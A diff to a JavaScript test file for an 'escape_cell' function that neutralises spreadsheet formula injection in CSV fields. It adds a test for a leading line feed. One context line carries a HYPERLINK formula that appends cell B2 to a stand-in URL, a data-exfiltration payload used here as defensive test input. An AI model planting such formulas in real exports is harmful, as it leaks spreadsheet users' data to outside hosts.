@@ -16,6 +16,10 @@ describe("escape_cell", () => {
     expect(escape_cell("\rfoo")).toBe(`"'\rfoo"`);
   });
 
+  test("prefixes a leading LF, then quotes the field", () => {
+    expect(escape_cell("\n=1+1")).toBe(`"'\n=1+1"`);
+  });
+
   test("prefixes before quoting, so the quote lands inside the field", () => {
     expect(escape_cell('=HYPERLINK("https://x/?"&B2,"click")')).toBe(
       `"'=HYPERLINK(""https://x/?""&B2,""click"")"`
